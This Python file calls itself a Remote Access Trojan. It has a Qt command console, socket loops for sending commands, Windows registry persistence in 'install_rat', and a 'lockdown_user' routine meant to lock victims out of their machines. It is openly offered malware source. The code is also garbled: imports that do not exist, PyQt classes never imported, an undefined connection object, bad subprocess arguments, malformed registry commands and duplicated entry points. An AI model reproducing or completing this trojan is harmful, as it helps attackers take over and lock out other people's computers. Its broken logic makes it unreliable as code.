#!/usr/bin/env python3

""" RAT v1.0 - Remote Access Trojan """

import os, sys, random, platform, time, threading
from socket import create_connection, AFUNC_RAW, SOCKAFILL
from urllib.parse import urlparse
import json
import requests
import re
import subprocess


# --- Configuration ---
HOST = "127.0.0.1"  # Change to your target IP address/hostname
PORT = 9999          # Choose a port (e.g., 9999, 8080)
COMMAND_INTERVAL = 3 # Send command every X seconds
LOCKDOWN_TIME = 60 # Lockdown for this long when the user is active
LOCKDOWN_TEXT = "Remote Access Locked"

# --- Core Data Structures ---
current_status = "Connected"
lockdown_active = False
lockdown_seconds_left = 0


# --- PyQt Widgets ---
class RATUI(QWidget):
    def __init__(self):
        super().__init__()

        self.setWindowTitle("Remote Access Terminal")
        self.setGeometry(10, 10, 400, 250)  # Adjust as needed

        self.status_label = QLabel("Connected", self)
        self.status_label.setAlignment(Qt.AlignCenter)

        self.command_input = QLineEdit("", self)
        self.command_input.setPlaceholderText("Enter command (e.g., ls)")
        self.command_input.returnPressed.connect(self.send_command)

        self.send_button = QPushButton("Send", self)
        self.send_button.clicked.connect(self.send_command)

        layout = QVBoxLayout()
        layout.addWidget(QLabel("Status:"))
        layout.addWidget(self.status_label)
        layout.addWidget(QLabel("Command:"))
        layout.addWidget(self.command_input)
        layout.addWidget(self.send_button)

        self.setLayout(layout)


    def update_status(self):
        if connection:
            self.status_label.setText("Connected")
            self.status_label.setStyleSheet("color: green;")  # Green for active
        else:
            self.status_label.setText("Disconnected")
            self.status_label.setStyleSheet("color: red;")   # Red for inactive

    def show_message(self, text):
        QMessageBox.information(self, "Message", text)


# --- Core Remote Access Logic ---
def run_rat():
    global current_status, lockdown_active, lockdown_seconds_left
    try:
        while True:
            if connection:
                # Send commands back and forth
                command = input(">>> ") # Get command from user

                if command.lower() == "exit":
                    break

                if len(command) > 0:
                    bytes_sent = connection.sendall(command.encode())
                    if bytes_sent < len(command):
                        print(f"Sent {bytes_sent} of {len(command)} bytes")
            else:
                # Check for a new connection if inactive
                try:
                    connection.settimeout(1) # Reduce timeout while disconnected
                    data = connection.recv(1024).decode()
                    if data:
                        print(f"Received: {data}")
                except socket.timeout:
                    pass

            time.sleep(COMMAND_INTERVAL)  # Send commands regularly

    finally:
        # Close connections when the program exits
        connection.close()


def receive_commands():
    global lockdown_active, lockdown_seconds_left
    try:
        while True:
            data = connection.recv(1024).decode()
            if data:
                print(f"Received: {data}")
                # --- Lockdown Logic ---
                if not lockdown_active and (len(data) > 0 or "exit" in data.lower()):
                    lockdown_seconds_left = lockdown_time
                    lockdown_active = True
                    print("Lockdown started.")

                    # Update GUI when locked
                    ui.update_status() # Force status update immediately
                else:
                    if lockdown_active and lockdown_seconds_left <= 0:
                        lockdown_active = False
                        lockdown_seconds_left = 0
                        print("Lockdown ended.")

                        # Update GUI when unlocked
                        ui.update_status()  # Force status update immediately

            time.sleep(0.5) # Check every half second for commands

    except socket.timeout:
        pass
    finally:
        connection.close()


# --- PyQt Threading ---
if __name__ == "__main__":
    app = QApplication([])
    ui = RATUI()

    # Start Core Remote Access in a separate thread
    remote_thread = threading.Thread(target=run_rat, daemon=True) # Daemon thread for clean exit
    remote_thread.start()

    # Start Command Receiving Thread
    receive_thread = threading.Thread(target=receive_commands, daemon=True)
    receive_thread.start()

    ui.show()

    try:
        app.exec_() # Keep GUI running until the user closes it

    except KeyboardInterrupt:
        print("Disconnecting...")
        connection.close()  # Close the connection when the window is closed
    finally:
        pass


# --- RAT Persistence Logic (Windows) ---
def install_rat():
    """ Installs the RAT on Windows systems for persistence. """
    try:
        os.system(f'reg add HKEY_CURRENT_USER\\Software\\Random ./ {random.randint(100, 999)}')
        os.system(f'echo Random is installed > C:\\ProgramData\\RAT\\install.txt') # Create hidden file
    except: pass  # Ignore errors


# --- RAT Lockdown Logic (Windows) ---
def lockdown_user():
    """ Locks the user out of their machine for a short period. """
    try:
        os.system(f'cmd /c echo "You have been Locked Out" > C:\\ProgramData\\LOCKDOWN\\status.txt') # Create status file
        time.sleep(5)  # Give some time to update the UI
        os.system(f'reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\\\System32\\RunMRW /v RAT >nul') # Add "Run" key in registry
        time.sleep(1)
    except: pass


# --- Utility Functions ---
def check_internet():
    """ Checks for a stable internet connection. """
    try:
        ping_host = input("Enter a host to ping (e.g., google.com): ") # Get host from user

        if not ping_host:
            return False

        # Ping the target 3 times with a small timeout of 1 second
        packet = re.compile(r'(.*?) (\d+) ms')
        output = subprocess.run(['ping', '-c', '3', ping_host], capture_output=True, textdim=True)

        if output.returncode == 0:
            match = packet.search(output.stdout)
            if match:
                result = match.group(1).strip() # Remove whitespace
                time_out = match.group(2).strip()  # Remove whitespace
                print(f"Ping Status: {result} ms ({time_out})")

                if float(time_out) < 200: # Check if ping is responsive within the timeout
                    return True
            else:
                return False
        else:
            return False  # Ping failed or timed out

    except Exception as e:
        print(f"Error checking internet connection: {e}")
        return False


def get_active_user():
    """ Gets the active user (username) on Windows. """
    try:
        result = subprocess.run(['cmd', '/c', 'query user'][0], shell=True, capture_output=True, textdim=True, check=True, errors='replace')
        return result.stdout.strip()
    except Exception as e:
        print(f"Error getting active user: {e}")
        return "SYSTEM"


# --- Main Function ---

if __name__ == "__main__":
    try:
        # Install Persistence
        install_rat()

        # Check Internet and connect if available
        if check_internet():
            print("Internet Connection Active. Starting...")
        else:
            print("No Internet Connection.  Check your connection.")
            sys.exit(0)

        # Lock down User
        lockdown_user()

    except Exception as e:
        print(f"General Error: {e}")
        sys.exit(1) # Exit with error code for debugging

    # Keep GUI open until the user closes it
    try:
        app.exec()
    except KeyboardInterrupt:
        print("Exiting...")
        sys.exit(0)

    finally:
        pass  # Ensure resources are freed, even if program exits abruptly
